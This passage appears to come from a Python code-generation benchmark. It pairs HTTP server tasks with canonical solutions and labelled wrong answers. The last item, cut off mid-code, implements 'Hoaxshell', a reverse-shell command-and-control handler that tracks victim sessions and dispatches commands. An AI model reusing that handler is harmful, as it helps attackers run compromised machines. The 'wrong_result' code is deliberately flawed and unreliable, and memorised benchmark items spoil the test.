    "Instruction": "Task Description: Create a Python HTTP server that handles POST requests, processes JSON data, and returns a modified JSON response. The server should be implemented using Python's built-in http.server module with customizable port and request handler.\n\nClass Description: The solution consists of two classes: PostHandler (request handler) and HTTPServerWrapper (server manager). PostHandler processes incoming POST requests and their JSON data, while HTTPServerWrapper manages the server lifecycle.\n\nAttributes:\n- port: int - The port number on which the HTTP server will listen (default: 8888)\n- handler_class: class - The request handler class to be used (default: PostHandler)\n- server_address: tuple - A tuple containing the server address and port\n- httpd: HTTPServer - The HTTP server instance\n\nMethods:\n- PostHandler.do_POST() -> None - Handles incoming POST requests, reads JSON data, processes it, and sends back a JSON response\n- PostHandler.process_data(data: dict) -> dict - Processes the incoming JSON data (can be overridden for custom processing)\n- HTTPServerWrapper.__init__(port: int = 8888, handler_class: class = PostHandler) -> None - Initializes the server with specified port and handler\n- HTTPServerWrapper.run() -> None - Starts the HTTP server and begins serving requests indefinitely",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\n\nclass PostHandler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        json_data = json.loads(post_data)\n\n        new_json_data = self.process_data(json_data)\n\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(json.dumps(new_json_data).encode('utf-8'))\n\n    def process_data(self, data):\n        return data\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8888, handler_class=PostHandler):\n        self.port = port\n        self.handler_class = handler_class\n        self.server_address = ('', self.port)\n        self.httpd = HTTPServer(self.server_address, self.handler_class)\n\n    def run(self):\n        print('Starting httpd on port {}'.format(self.port))\n        self.httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport json\n\nclass PostHandler(http.server.BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        data = json.loads(post_data)\n\n        processed_data = self.process_data(data)\n\n        self.send_response(200)\n        self.send_header('Content-Type', 'application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps(processed_data).encode())\n\n    def process_data(self, data):\n        return {'received': True, 'data': data}\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8888, handler_class=PostHandler):\n        self.port = port\n        self.handler_class = handler_class\n        self.server_address = ('', self.port)\n        self.httpd = socketserver.TCPServer(self.server_address, self.handler_class)\n\n    def run(self):\n        print(f'Starting server on port {self.port}')\n        self.httpd.serve_forever()\n```"
  },
  {
    "Task_id": 22,
    "Instruction": "Task Description: Implement a class for handling HTTP requests to a server, supporting both GET and POST methods, with optional proxy support and response parsing capabilities.\n\nClass Description: WARequest is a class designed to facilitate HTTP communication with a server. It provides methods for sending GET and POST requests, handling response parsing, and managing request parameters and headers. The class supports both direct connections and proxy connections.\n\nAttributes:\n\npvars: [list] - List of variables that can be parsed from the response\nport: [int] - Port number for the HTTP connection (default: 443)\ntype: [str] - HTTP request type (GET or POST)\nparser: [ResponseParser] - Parser object for processing the response\nparams: [list] - List of tuples containing request parameters\nheaders: [dict] - Dictionary of HTTP headers to be sent with the request\nsent: [bool] - Flag indicating if the request has been sent\nresponse: [HTTPResponse] - The response object from the server\nurl: [str] - The target URL for the request\n\nMethods:\n\nsetParsableVariables: [setParsableVariables](pvars: list) -> None - Sets the list of variables that can be parsed from the response\naddParam: [addParam](name: str, value: str) -> None - Adds a parameter to the request\nremoveParam: [removeParam](name: str) -> None - Removes a parameter from the request\naddHeaderField: [addHeaderField](name: str, value: str) -> None - Adds a header field to the request\nclearParams: [clearParams]() -> None - Clears all request parameters\ngetUserAgent: [getUserAgent]() -> str - Returns the user agent string\nsend: [send](parser: ResponseParser = None) -> dict - Sends the request (GET or POST based on type) and returns parsed response\nsetParser: [setParser](parser: ResponseParser) -> None - Sets the response parser\ngetConnectionParameters: [getConnectionParameters]() -> tuple - Returns host, port, and path from the URL\nsendGetRequest: [sendGetRequest](parser: ResponseParser = None) -> dict - Sends a GET request and returns parsed response\nsendPostRequest: [sendPostRequest](parser: ResponseParser = None) -> dict - Sends a POST request and returns parsed response\nsendRequest: [sendRequest](host: str, port: int, path: str, headers: dict, params: list, reqType: str = \"GET\") -> HTTPResponse - Static method to send a direct HTTP request\nsendRequestWithProxy: [sendRequestWithProxy](host: str, port: int, path: str, headers: dict, params: list, proxy: HttpProxy) -> dict - Static method to send a request through a proxy\nbuild_get_url: [build_get_url](host: str, path: str, params: list) -> str - Static method to build a GET URL\nbuild_headers: [build_headers](headers_tuple: dict) -> list - Static method to convert headers dictionary to curl format",
    "Canonical_solution": "import urllib\nimport sys\nimport os\nimport logging\nfrom http import client as httplib\nfrom urllib.parse import urlencode\nfrom .httpproxy import HttpProxy\nfrom yowsup.env import YowsupEnv\n\nlogger = logging.getLogger(__name__)\n\nclass WARequest:\n    OK = 200\n\n    def __init__(self):\n        self.pvars = []\n        self.port = 443\n        self.type = \"GET\"\n        self.parser = None\n        self.params = []\n        self.headers = {}\n        self.sent = False\n        self.response = None\n\n    def setParsableVariables(self, pvars):\n        self.pvars = pvars\n\n    def addParam(self, name, value):\n        self.params.append((name, value))\n\n    def removeParam(self, name):\n        for i in range(0, len(self.params)):\n            if self.params[i][0] == name:\n                del self.params[i]\n\n    def addHeaderField(self, name, value):\n        self.headers[name] = value\n\n    def clearParams(self):\n        self.params = []\n\n    def getUserAgent(self):\n        return YowsupEnv.getCurrent().getUserAgent()\n\n    def send(self, parser=None):\n        if self.type == \"POST\":\n            return self.sendPostRequest(parser)\n        return self.sendGetRequest(parser)\n\n    def setParser(self, parser):\n        if isinstance(parser, ResponseParser):\n            self.parser = parser\n        else:\n            logger.error(\"Invalid parser\")\n\n    def getConnectionParameters(self):\n        if not self.url:\n            return \"\", \"\", self.port\n\n        try:\n            url = self.url.split(\"://\", 1)\n            url = url[0] if len(url) == 1 else url[1]\n            host, path = url.split('/', 1)\n        except ValueError:\n            host = url\n            path = \"\"\n\n        path = \"/\" + path\n        return host, self.port, path\n\n    def sendGetRequest(self, parser=None):\n        self.response = None\n        params = self.params\n        parser = parser or self.parser or ResponseParser()\n        headers = dict(list({\"User-Agent\": self.getUserAgent(),\n                           \"Accept\": parser.getMeta()\n                          }.items()) + list(self.headers.items()))\n\n        host, port, path = self.getConnectionParameters()\n        proxy = HttpProxy.getFromEnviron()\n        if proxy is None:\n            self.response = WARequest.sendRequest(host, port, path, headers, params, \"GET\")\n            if not self.response.status == WARequest.OK:\n                logger.error(\"Request not success, status was %s\" % self.response.status)\n                return {}\n\n            data = self.response.read()\n            logger.info(data)\n            self.sent = True\n            return parser.parse(data.decode(), self.pvars)\n        else:\n            logger.info(\"Request with proxy\")\n            self.response = WARequest.sendRequestWithProxy(host, port, path, headers, params, proxy)\n            logger.info(self.response)\n            return self.response\n\n    def sendPostRequest(self, parser=None):\n        self.response = None\n        params = self.params\n        parser = parser or self.parser or ResponseParser()\n        headers = dict(list({\"User-Agent\": self.getUserAgent(),\n                           \"Accept\": parser.getMeta(),\n                           \"Content-Type\": \"application/x-www-form-urlencoded\"\n                          }.items()) + list(self.headers.items()))\n\n        host, port, path = self.getConnectionParameters()\n        self.response = WARequest.sendRequest(host, port, path, headers, params, \"POST\")\n\n        if not self.response.status == WARequest.OK:\n            logger.error(\"Request not success, status was %s\" % self.response.status)\n            return {}\n\n        data = self.response.read()\n        logger.info(data)\n        self.sent = True\n        return parser.parse(data.decode(), self.pvars)\n\n    @staticmethod\n    def sendRequest(host, port, path, headers, params, reqType=\"GET\"):\n        params = urlencode(params)\n        path = path + \"?\" + params if reqType == \"GET\" and params else path\n\n        if len(headers):\n            logger.debug(headers)\n        if len(params):\n            logger.debug(params)\n\n        logger.debug(\"Opening connection to %s\" % host)\n        conn = httplib.HTTPSConnection(host, port) if port == 443 else httplib.HTTPConnection(host, port)\n\n        logger.debug(\"Sending %s request to %s\" % (reqType, path))\n        conn.request(reqType, path, params, headers)\n        response = conn.getresponse()\n        return response\n\n    @staticmethod\n    def sendRequestWithProxy(host, port, path, headers, params, proxy):\n        import pycurl\n        import json\n        from io import BytesIO\n        logger.info(\"SENDING PROXY REQUEST WITH %s\" % proxy.getHost())\n        bytes_buffer = BytesIO()\n        c = pycurl.Curl()\n        c.setopt(pycurl.URL, WARequest.build_get_url(host, path, params))\n        c.setopt(pycurl.PROXY, proxy.getHost())\n        c.setopt(pycurl.PROXYPORT, proxy.getPort())\n        if proxy.getUserName() is not None:\n            c.setopt(pycurl.PROXYUSERPWD, \"%s:%s\" % (proxy.getUser(), proxy.getPassword()))\n        c.setopt(pycurl.PORT, port)\n        c.setopt(pycurl.HTTPHEADER, WARequest.build_headers(headers))\n        c.setopt(pycurl.WRITEDATA, bytes_buffer)\n        c.perform()\n        c.close()\n        data = bytes_buffer.getvalue().decode('utf-8')\n        return json.loads(data)\n\n    @staticmethod\n    def build_get_url(host, path, params):\n        params = urlencode(params)\n        url = 'https://' + host + path + \"?\" + params\n        return url\n\n    @staticmethod\n    def build_headers(headers_tuple):\n        headers_array = []\n        for idx in headers_tuple:\n            headers_array.append(idx + \":\" + headers_tuple[idx])\n        return headers_array",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport http.client\nimport urllib.parse\n\nclass WARequest:\n    def __init__(self, url, type=\"GET\", port=443):\n        self.pvars = []\n        self.port = port\n        self.type = type.upper()\n        self.parser = None\n        self.params = []\n        self.headers = {}\n        self.sent = False\n        self.response = None\n        self.url = url\n\n    def setParsableVariables(self, pvars):\n        self.pvars = pvars\n\n    def addParam(self, name, value):\n        self.params.append((name, value))\n\n    def removeParam(self, name):\n        self.params = [(n, v) for n, v in self.params if n != name]\n\n    def addHeaderField(self, name, value):\n        self.headers[name] = value\n\n    def clearParams(self):\n        self.params.clear()\n\n    def getUserAgent(self):\n        return \"WARequest/1.0\"\n\n    def send(self, parser=None):\n        if parser:\n            self.setParser(parser)\n        host, port, path = self.getConnectionParameters()\n        if self.type == \"GET\":\n            response = self.sendGetRequest(parser)\n        else:\n            response = self.sendPostRequest(parser)\n        return response\n\n    def setParser(self, parser):\n        self.parser = parser\n\n    def getConnectionParameters(self):\n        parsed_url = urllib.parse.urlparse(self.url)\n        host = parsed_url.netloc\n        path = parsed_url.path or \"/\"\n        port = self.port\n        return host, port, path\n\n    def sendGetRequest(self, parser=None):\n        host, port, path = self.getConnectionParameters()\n        headers = self.build_headers(self.headers)\n        params = urllib.parse.urlencode(self.params)\n        if params:\n            path += \"?\" + params\n        conn = http.client.HTTPSConnection(host, port)\n        conn.request(\"GET\", path, headers=headers)\n        res = conn.getresponse()\n        data = res.read().decode('utf-8')\n        self.response = res\n        self.sent = True\n        if parser:\n            return parser.parse(data)\n        return {\"status\": res.status, \"reason\": res.reason, \"data\": data}\n\n    def sendPostRequest(self, parser=None):\n        host, port, path = self.getConnectionParameters()\n        headers = self.build_headers(self.headers)\n        headers[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\n        body = urllib.parse.urlencode(self.params)\n        conn = http.client.HTTPSConnection(host, port)\n        conn.request(\"POST\", path, body=body, headers=headers)\n        res = conn.getresponse()\n        data = res.read().decode('utf-8')\n        self.response = res\n        self.sent = True\n        if parser:\n            return parser.parse(data)\n        return {\"status\": res.status, \"reason\": res.reason, \"data\": data}\n\n    @staticmethod\n    def sendRequest(host, port, path, headers, params, reqType=\"GET\"):\n        conn = http.client.HTTPSConnection(host, port)\n        if reqType == \"GET\" and params:\n            path += \"?\" + urllib.parse.urlencode(params)\n        conn.request(reqType, path, headers=headers)\n        return conn.getresponse()\n\n    @staticmethod\n    def sendRequestWithProxy(host, port, path, headers, params, proxy):\n        conn = http.client.HTTPSConnection(proxy.host, proxy.port)\n        target = f\"{host}:{port}{path}\"\n        if params:\n            target += \"?\" + urllib.parse.urlencode(params)\n        headers[\"Host\"] = host\n        conn.request(\"GET\", target, headers=headers)\n        return conn.getresponse()\n\n    @staticmethod\n    def build_get_url(host, path, params):\n        param_str = urllib.parse.urlencode(params)\n        return f\"https://{host}{path}?{param_str}\"\n\n    @staticmethod\n    def build_headers(headers_tuple):\n        headers = []\n        for k, v in headers_tuple.items():\n            headers.append(f\"{k}: {v}\")\n        return \"\\r\\n\".join(headers)\n```"
  },
  {
    "Task_id": 220,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server using the `http.server` module to handle GET and POST requests, with custom response handling and error management.\n\nClass Description: The `YamlComposerHttp` class encapsulates an HTTP server that listens on a specified port and handles incoming GET and POST requests. It includes an inner class `_HttpServer` that extends `BaseHTTPRequestHandler` to define custom request handling logic.\n\nAttributes:\n\n- args: [object] - Configuration object containing server parameters, including the HTTP port to listen on.\n\nMethods:\n\n- __init__(args) -> None - Initializes the `YamlComposerHttp` instance with the provided configuration.\n  - Input: \n    - args: [object] - Configuration object containing server parameters.\n  - Output: None\n\n- run() -> None - Starts the HTTP server and begins listening for incoming requests indefinitely until interrupted.\n  - Input: None\n  - Output: None\n\nInner Class: _HttpServer(BaseHTTPRequestHandler)\n\nMethods:\n\n- _set_response(msg: str, code: int = 200) -> None - Helper method to send an HTTP response with the specified message and status code.\n  - Input:\n    - msg: [str] - The message to include in the response body.\n    - code: [int] - The HTTP status code (default: 200).\n  - Output: None\n\n- do_GET() -> None - Handles incoming GET requests. Responds with a default HTML page for the root path ('/') or an error for invalid paths.\n  - Input: None\n  - Output: None\n\n- do_POST() -> None - Handles incoming POST requests. Processes form data from '/generate' path or returns an error for invalid paths.\n  - Input: None\n  - Output: None",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import parse_qs\n\nclass YamlComposerHttp:\n    def __init__(self, args):\n        self.args = args\n\n    class _HttpServer(BaseHTTPRequestHandler):\n        def _set_response(self, msg: str, code: int = 200):\n            self.send_response(code)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(msg.encode('utf-8'))\n\n        def do_GET(self):\n            if str(self.path) != '/':\n                self._set_response('<h1>\"%s\" is not a valid entrypoint</h1>' % self.path, 400)\n                return\n            self._set_response(self.default_html)\n\n        def do_POST(self):\n            if str(self.path) != '/generate':\n                self._set_response('<h1>\"%s\" is not a valid entrypoint</h1>' % self.path, 400)\n                return\n            content_length = int(self.headers['Content-Length'])\n            data = self.rfile.read(content_length)\n            data = {k: v[0] for k, v in parse_qs(data.decode('utf-8')).items()}\n            self._set_response(*parse_http_data(data, self.args))\n\n    def run(self):\n        httpd = HTTPServer(('0.0.0.0', self.args.http_port), self._HttpServer)\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            pass\n        finally:\n            httpd.server_close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport sys\n\nclass YamlComposerHttp:\n    def __init__(self, args):\n        self.port = args.http_port if hasattr(args, 'http_port') else 8000\n\n    def run(self):\n        try:\n            with socketserver.TCPServer((\"\", self.port), self._HttpServer) as httpd:\n                print(f\"Serving on port {self.port}\")\n                httpd.serve_forever()\n        except KeyboardInterrupt:\n            print(\"\\nShutting down server.\")\n            httpd.shutdown()\n\n    class _HttpServer(http.server.BaseHTTPRequestHandler):\n        def _set_response(self, msg: str, code: int = 200) -> None:\n            self.send_response(code)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(msg.encode('utf-8'))\n\n        def do_GET(self):\n            if self.path == '/':\n                response = \"<html><body><h1>Welcome to the YAML Composer Server</h1></body></html>\"\n                self._set_response(response, 200)\n            else:\n                self._set_response(\"Error: Page not found\", 404)\n\n        def do_POST(self):\n            if self.path == '/generate':\n                content_length = int(self.headers['Content-Length'])\n                post_data = self.rfile.read(content_length).decode('utf-8')\n                response = f\"<html><body><h1>Received POST data:</h1><p>{post_data}</p></body></html>\"\n                self._set_response(response, 200)\n            else:\n                self._set_response(\"Error: Invalid endpoint\", 400)\n```"
  },
  {
    "Task_id": 222,
    "Instruction": "Task Description: Create a Python class that implements a simple HTTP server using the http.server module, capable of handling GET requests with customizable response status codes and running in a separate thread.\n\nClass Description: The HttpServer class provides a lightweight HTTP server implementation that can be started and stopped programmatically. It handles GET requests, supports custom response status codes via URL paths, and runs in a daemon thread for non-blocking operation.\n\nAttributes:\n\nDEFAULT_RESPONSE: bytes - Default response body sent for successful requests (default: b\"Hello!\")\nserver: HTTPServer - Instance of the HTTP server\nserver_thread: Thread - Thread running the server's serve_forever loop\n\nMethods:\n\n__init__: () -> None - Initializes the HttpServer instance with server and server_thread set to None\ncreate_server: () -> HTTPServer - Creates and returns an HTTPServer instance bound to localhost on an available port\nrun_server: () -> Tuple[Thread, HTTPServer] - Starts the server in a daemon thread and returns both the thread and server objects\nstart: () -> None - Convenience method to start the server (calls run_server and stores the results)\nshutdown: () -> None - Stops the server and joins the server thread if they exist\n\nNested Class: Handler(BaseHTTPRequestHandler) - Custom request handler for processing HTTP requests\n\nHandler Attributes:\nprotocol_version: str - HTTP protocol version (default: \"HTTP/1.1\")\ntimeout: int - Connection timeout in seconds (default: 3)\nSTATUS_RE: Pattern - Regular expression for matching status code paths\n\nHandler Methods:\ndo_GET: () -> None - Handles GET requests, supports /status/{code} paths to return specific status codes",
    "Canonical_solution": "import re\nfrom http import HTTPStatus\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom threading import Thread\n\nclass HttpServer:\n    DEFAULT_RESPONSE = b\"Hello!\"\n\n    class Handler(BaseHTTPRequestHandler):\n        protocol_version = \"HTTP/1.1\"\n        timeout = 3\n\n        STATUS_RE = re.compile(r\"/status/(\\d+)\")\n\n        def do_GET(self):\n            status_match = self.STATUS_RE.fullmatch(self.path)\n            status = 200\n            if status_match:\n                status = int(status_match.group(1))\n            if status == 200:\n                body = HttpServer.DEFAULT_RESPONSE\n                self.send_response(HTTPStatus.OK)\n                self.send_header(\"Content-Length\", str(len(body)))\n                self.end_headers()\n                self.wfile.write(body)\n            else:\n                self.send_error(status)\n\n    def __init__(self):\n        self.server = None\n        self.server_thread = None\n\n    def create_server(self):\n        server_address = (\"127.0.0.1\", 0)\n        return HTTPServer(server_address, self.Handler)\n\n    def run_server(self):\n        self.server = self.create_server()\n        self.server_thread = Thread(\n            target=self.server.serve_forever, daemon=True, name=\"Test server worker\"\n        )\n        self.server_thread.start()\n        return self.server_thread, self.server\n\n    def start(self):\n        self.server_thread, self.server = self.run_server()\n\n    def shutdown(self):\n        if self.server:\n            self.server.shutdown()\n        if self.server_thread:\n            self.server_thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport threading\nimport re\nfrom typing import Tuple, Optional, Pattern\n\nclass HttpServer:\n    DEFAULT_RESPONSE = b\"Hello!\"\n\n    class Handler(http.server.BaseHTTPRequestHandler):\n        protocol_version = \"HTTP/1.1\"\n        timeout = 3\n        STATUS_RE: Pattern = re.compile(r\"/status/(\\d+)\")\n\n        def do_GET(self) -> None:\n            match = self.STATUS_RE.match(self.path)\n            if match:\n                status_code = int(match.group(1))\n                self.send_response(status_code)\n            else:\n                self.send_response(200)\n                self.send_header(\"Content-Length\", str(len(self.server.DEFAULT_RESPONSE)))\n                self.end_headers()\n                self.wfile.write(self.server.DEFAULT_RESPONSE)\n\n    def __init__(self) -> None:\n        self.server: Optional[socketserver.TCPServer] = None\n        self.server_thread: Optional[threading.Thread] = None\n\n    def create_server(self) -> socketserver.TCPServer:\n        with socketserver.TCPServer((\"localhost\", 0), self.Handler) as server:\n            server.DEFAULT_RESPONSE = self.DEFAULT_RESPONSE\n            return server\n\n    def run_server(self) -> Tuple[threading.Thread, socketserver.TCPServer]:\n        self.server = self.create_server()\n        thread = threading.Thread(target=self.server.serve_forever, daemon=True)\n        thread.start()\n        return thread, self.server\n\n    def start(self) -> None:\n        self.server_thread, self.server = self.run_server()\n\n    def shutdown(self) -> None:\n        if self.server:\n            self.server.shutdown()\n        if self.server_thread and self.server_thread.is_alive():\n            self.server_thread.join()"
  },
  {
    "Task_id": 223,
    "Instruction": "Task Description: Create a Python class that implements a simple HTTP server to serve static files (CSS, JavaScript, and images) with proper content types and error handling.\n\nClass Description: PVEDiscordDarkServer is a class that creates an HTTP server to serve static web resources including CSS files, JavaScript files, and various image formats (PNG, JPG, JPEG, SVG). It handles different file types with appropriate content headers and provides error responses for missing files or unsupported requests.\n\nAttributes:\nPORT: int - The port number on which the HTTP server will run\nDIR_SASS: str - The directory path containing CSS files\nDIR_IMAGES: str - The directory path containing image files\nDIR_JS: str - The directory path containing JavaScript files\n\nMethods:\n__init__(port=3000) -> None - Initializes the server with the specified port (default: 3000) and sets up directory paths for static files\nrun() -> None - Starts the HTTP server and begins serving requests indefinitely until interrupted\nRequestHandler: class - Inner class that handles HTTP requests (inherits from BaseHTTPRequestHandler)\n    __init__(*args, **kwargs) -> None - Initializes the request handler with directory paths\n    log_message(format, *args) -> None - Overrides default logging to suppress log messages\n    _set_headers(status, type) -> None - Helper method to set HTTP response headers\n    do_GET() -> None - Handles GET requests, serves appropriate files with correct content types, or returns error responses",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nimport json\nimport os\n\nclass PVEDiscordDarkServer:\n    def __init__(self, port=3000):\n        self.PORT = port\n        self.DIR_SASS = os.path.join(os.path.dirname(__file__), \"sass\")\n        self.DIR_IMAGES = os.path.join(os.path.dirname(__file__), \"images\")\n        self.DIR_JS = os.path.join(os.path.dirname(__file__), \"js\")\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def __init__(self, *args, **kwargs):\n            self.DIR_SASS = kwargs.pop('DIR_SASS')\n            self.DIR_IMAGES = kwargs.pop('DIR_IMAGES')\n            self.DIR_JS = kwargs.pop('DIR_JS')\n            super().__init__(*args, **kwargs)\n\n        def log_message(self, format, *args):\n            return\n\n        def _set_headers(self, status, type):\n            self.send_response(status)\n            self.send_header(\"Content-type\", type)\n            self.end_headers()\n\n        def do_GET(self):\n            status = 200\n            type = \"application/json\"\n            data = None\n\n            file = self.path.rpartition(\"/\")[2]\n            ext = file.rpartition(\".\")[2]\n\n            if ext == \"css\":\n                data = open(os.path.join(self.DIR_SASS, \"PVEDiscordDark.css\"), \"rb\").read()\n                type = \"text/css\"\n            elif ext == \"js\":\n                data = open(os.path.join(self.DIR_JS, \"PVEDiscordDark.js\"), \"rb\").read()\n                type = \"application/javascript\"\n            elif ext in (\"png\", \"jpg\", \"jpeg\"):\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/{ext}\"\n                except FileNotFoundError:\n                    status = 404\n            elif ext == \"svg\":\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/svg+xml\"\n                except FileNotFoundError:\n                    status = 404\n            else:\n                status = 400\n            self._set_headers(status, type)\n            if status == 200:\n                self.wfile.write(data)\n            else:\n                self.wfile.write(json.dumps({\"error\": status}).encode())\n\n    def run(self):\n        print(f\"Serving on localhost:{self.PORT}\")\n        server = HTTPServer(\n            server_address=(\"\", self.PORT),\n            RequestHandlerClass=lambda *args, **kwargs: self.RequestHandler(\n                *args,\n                DIR_SASS=self.DIR_SASS,\n                DIR_IMAGES=self.DIR_IMAGES,\n                DIR_JS=self.DIR_JS,\n                **kwargs\n            )\n        )\n        try:\n            server.serve_forever()\n        except KeyboardInterrupt:\n            quit()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport os\n\nclass PVEDiscordDarkServer:\n    PORT = 3000\n    DIR_SASS = \"static/css\"\n    DIR_IMAGES = \"static/images\"\n    DIR_JS = \"static/js\"\n\n    def __init__(self, port=3000):\n        self.PORT = port\n        os.makedirs(self.DIR_SASS, exist_ok=True)\n        os.makedirs(self.DIR_IMAGES, exist_ok=True)\n        os.makedirs(self.DIR_JS, exist_ok=True)\n\n    def run(self):\n        handler_class = self.RequestHandler\n        handler_class.dir_sass = self.DIR_SASS\n        handler_class.dir_images = self.DIR_IMAGES\n        handler_class.dir_js = self.DIR_JS\n        with socketserver.TCPServer((\"\", self.PORT), handler_class) as httpd:\n            print(f\"Serving on port {self.PORT}\")\n            try:\n                httpd.serve_forever()\n            except KeyboardInterrupt:\n                print(\"\\nShutting down server.\")\n                httpd.shutdown()\n\n    class RequestHandler(http.server.BaseHTTPRequestHandler):\n        dir_sass = \"\"\n        dir_images = \"\"\n        dir_js = \"\"\n\n        def log_message(self, format, *args):\n            pass\n\n        def _set_headers(self, status, content_type=\"text/plain\"):\n            self.send_response(status)\n            self.send_header(\"Content-type\", content_type)\n            self.end_headers()\n\n        def do_GET(self):\n            path = self.path\n\n            if path.endswith(\".css\"):\n                file_path = os.path.join(self.dir_sass, path[1:])\n                content_type = \"text/css\"\n            elif path.endswith((\".png\", \".jpg\", \".jpeg\", \".svg\")):\n                file_path = os.path.join(self.dir_images, path[1:])\n                if path.endswith(\".svg\"):\n                    content_type = \"image/svg+xml\"\n                else:\n                    content_type = f\"image/{path.split('.')[-1]}\"\n            elif path.endswith(\".js\"):\n                file_path = os.path.join(self.dir_js, path[1:])\n                content_type = \"application/javascript\"\n            elif path == \"/\":\n                file_path = os.path.join(self.dir_sass, \"index.html\")\n                content_type = \"text/html\"\n            else:\n                self._set_headers(404)\n                self.wfile.write(b\"404 Not Found\")\n                return\n\n            if not os.path.isfile(file_path):\n                self._set_headers(404)\n                self.wfile.write(b\"404 Not Found\")\n                return\n\n            try:\n                with open(file_path, \"rb\") as f:\n                    self._set_headers(200, content_type)\n                    self.wfile.write(f.read())\n            except Exception as e:\n                self._set_headers(500)\n                self.wfile.write(b\"500 Internal Server Error\")\n```"
  },
  {
    "Task_id": 225,
    "Instruction": "Task Description: Create a custom HTTP server class that handles GET, POST, and OPTIONS requests for managing shell sessions, including session verification, command execution, and response handling.\n\nClass Description: Hoaxshell is a custom HTTP request handler that extends BaseHTTPRequestHandler to manage reverse shell sessions. It handles session establishment, command execution, and response collection while maintaining session state.\n\nAttributes:\n- server_name: [str] - Name identifier for the server\n- header_id: [str] - Custom header identifier for session tracking\n- server_unique_id: [str] - Unique identifier for the server instance\n- command_pool: [dict] - Pool of commands to be executed per session\n\nMethods:\n- do_GET([self]) -> None - Handles GET requests for session verification and command retrieval\n- do_POST([self]) -> None - Handles POST requests for command output submission\n- do_OPTIONS([self]) -> None - Handles OPTIONS requests for CORS preflight\n- log_message([self, format, *args]) -> None - Overrides default logging to suppress messages\n- initiate_hoax_server() -> None - Static method to start the HTTP server with optional SSL support\n\nThe class interacts with session management components and implements custom request handling for shell session management, including session verification, command distribution, and response collection. It supports both HTTP and HTTPS modes with configurable ports and SSL certificates.",
    "Canonical_solution": "```python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport ssl\n\nclass Hoaxshell(BaseHTTPRequestHandler):\n    server_name = 'Hoaxshell Multi-Handler'\n    header_id = None\n    server_unique_id = None\n    command_pool = {}\n\n    def do_GET(self):\n        timestamp = int(datetime.now().timestamp())\n        \n        if not self.header_id:\n            header_id_extract = [header.replace(\"X-\", \"\") for header in self.headers.keys() if re.match(\"X-[a-z0-9]{4}-[a-z0-9]{4}\", header)]\n            self.header_id = f'X-{header_id_extract[0]}'\n\n        try:\n            session_id = self.headers.get(self.header_id)\n        except:\n            session_id = None\n\n        if session_id and (session_id not in Sessions_Manager.active_sessions.keys()):\n            if session_id in Sessions_Manager.legit_session_ids.keys():\n                h = session_id.split('-')\n                Sessions_Manager.verify.append(h[0])\n                Sessions_Manager.get_cmd.append(h[1])\n                Sessions_Manager.post_res.append(h[2])\n\n                Sessions_Manager.active_sessions[session_id] = {\n                    'IP Address': self.client_address[0],\n                    'Port': self.client_address[1],\n                    'execution_verified': False,\n                    'Status': 'Active',\n                    'last_received': timestamp,\n                    'OS Type': Sessions_Manager.legit_session_ids[session_id]['OS Type'],\n                    'frequency': Sessions_Manager.legit_session_ids[session_id]['frequency'],\n                    'Owner': self.server_unique_id,\n                    'self_owned': True,\n                    'aliased': False,\n                    'alias': None,\n                    'Listener': 'hoaxshell',\n                    'Shell': Sessions_Manager.legit_session_ids[session_id]['Shell'],\n                    'iface': Sessions_Manager.legit_session_ids[session_id]['iface'],\n                    'prompt': None,\n                    'Stability': 'Unstable'\n                }\n                self.command_pool[session_id] = []\n\n        elif session_id and (session_id in Sessions_Manager.active_sessions.keys()):\n            Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n\n        self.server_version = Hoaxshell_Settings.server_version\n        self.sys_version = \"\"\n        session_id = self.headers.get(self.header_id)\n        legit = True if session_id in Sessions_Manager.legit_session_ids.keys() else False\n\n        url_split = self.path.strip(\"/\").split(\"/\")\n\n        if (url_split[0] in Sessions_Manager.verify and legit) or \\\n           (legit and session_id in Sessions_Manager.active_sessions and not Sessions_Manager.active_sessions[session_id]['execution_verified']):\n            \n            if Sessions_Manager.active_sessions[session_id]['execution_verified']:\n                print_to_prompt(f'\\r[{INFO}] Received \"Verify execution\" request from an already established session (ignored).')\n                return\n\n            self.send_response(200)\n            self.send_header('Content-type', 'text/javascript; charset=UTF-8')\n            self.send_header('Access-Control-Allow-Origin', '*')\n            self.end_headers()\n            self.wfile.write(bytes('OK', \"utf-8\"))\n            Sessions_Manager.active_sessions[session_id]['execution_verified'] = True\n\n            try:\n                Sessions_Manager.active_sessions[session_id]['Computername'] = url_split[1]\n                Sessions_Manager.active_sessions[session_id]['Username'] = url_split[2]\n                print_to_prompt(f'\\r[{GREEN}Shell{END}] {session_id} - New session established -> 